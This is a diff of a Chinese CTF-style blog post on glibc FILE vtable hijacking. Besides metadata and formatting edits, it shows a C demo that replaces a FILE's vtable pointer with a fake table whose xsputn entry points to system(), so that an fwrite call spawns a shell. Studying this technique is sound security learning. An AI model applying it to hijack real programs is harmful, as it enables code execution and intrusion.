@@ -33,7 +33,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic.imgdb.cn/item/60f00aa75132923bf87dc5bd.jpg">
 <meta property="article:published_time" content="2021-07-15T07:38:14.000Z">
-<meta property="article:modified_time" content="2021-07-15T10:38:07.407Z">
+<meta property="article:modified_time" content="2021-07-16T03:49:09.915Z">
 <meta property="article:author" content="mark0519">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="python2">
@@ -275,10 +275,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2021-07-15 15:38:14 / 修改时间：18:38:07" itemprop="dateCreated datePublished" datetime="2021-07-15T15:38:14+08:00">2021-07-15</time>
+      <time title="创建时间：2021-07-15 15:38:14" itemprop="dateCreated datePublished" datetime="2021-07-15T15:38:14+08:00">2021-07-15</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-07-16 11:49:09" itemprop="dateModified" datetime="2021-07-16T11:49:09+08:00">2021-07-16</time>
+      </span>
 
   
     <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -314,7 +320,7 @@
 <p>这个函数表中有19个函数，分别完成IO相关的功能，由IO函数调用，如<code>fwrite</code>最终会调用<code>__write</code>函数、<code>fread</code>会调用<code>__doallocate</code>来分配IO缓冲区等。</p>
 <p><strong>vtable劫持的原理是：如果能够控制FILE结构体，实现对vtable指针的修改，使得vtable指向可控的内存，在该内存中构造好vtable，再通过调用相应IO函数，触发vtable函数的调用，即可劫持程序执行流。</strong></p>
 <p>从原理中可以看到，劫持最关键的点在于修改IO FILE结构体的vtable指针，指向可控内存。一般来说有两种方式：一种是只修改内存中已有FILE结构体的vtable字段；另一种则是伪造整个FILE结构体。当然，两种的本质最终都是修改了vtable字段。</p>
-<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，**对于 fopen 的情况下是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。</p>
+<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，<strong>对于 fopen 的情况下是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a523a0;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。</p>
@@ -324,7 +330,7 @@
 
 <p>所以修改vtable中的xsputn为system函数</p>
 <p>同时因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"><span class="comment">//这里我本地的system函数地址和ctfwiki上的示例不太一样，换成我自己的地址才能跑通的</span></span><br></pre></td></tr></table></figure>
 
 <p>即可getshell</p>
 <p><img src="https://pic.imgdb.cn/item/60f00aa75132923bf87dc5bd.jpg"></p>
